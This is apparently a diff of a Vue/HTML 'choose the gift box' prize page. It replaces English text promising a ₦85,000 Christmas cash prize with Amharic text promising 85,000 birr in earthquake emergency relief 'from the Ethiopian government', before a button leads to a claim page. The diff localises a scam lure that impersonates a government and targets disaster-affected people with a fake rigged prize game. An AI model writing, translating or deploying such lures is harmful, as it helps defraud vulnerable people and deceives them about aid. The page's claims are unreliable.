@@ -292,36 +292,36 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">እንኳን ደስ አላችሁ! መልሶችህ ተቀምጠዋል</h2>
  
 <p class="paragraph">
-Now you have a chance to win ₦85,000 Christmas Celebration cash prize<br><br>
-You have 3 chances ! we wish you good luck
+አሁን ለራስዎ እና ለምትወዷቸው ሰዎች ብር 85,000 ፈጣን የእርዳታ ፈንዶችን የመቀበል እድል አልዎት<br><br>
+3 እድሎች አሉዎት! መልካም እድል እንመኝልዎታለን
 <br><br>
-You need to select the box that has the gift inside the boxes.
+በሳጥኖቹ ውስጥ ስጦታ ያለውን ሳጥን መምረጥ ያስፈልግዎታል.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+ጀምር
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">በሚቀጥለው ጊዜ የተሻለ ዕድል</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+(2) ተጨማሪ እድሎች አሎት።
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
-OK
+እሺ
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEht0RiAUUHiecInrqw5MTGENr9S0u5wGGS-mkcA9sFbyy4J4-OjZfc19YHCgj-uUWjigcVvj36nulYK0fzErdep8RJl1DWCk3c4-qj8m7bTAlyYpYeHPLaZ5-k8wrvLK7MT8oBhSapI3oLaYQ2duHxDZf6OAhN5b9JNe4L2kr2zM5r5zBAhxJFiWYHkHeY/s1030/usaaai.png" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">እንኳን ደስ አላችሁ! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> ₦85,000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+እንኳን በደህና መጡ <b>ብር 85,000 የመሬት መንቀጥቀጥ ፈጣን የእርዳታ ገንዘብ ከኢትዮጵያ መንግስት</b>, ይህንን እርዳታ ለማግኘት አያመንቱ
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
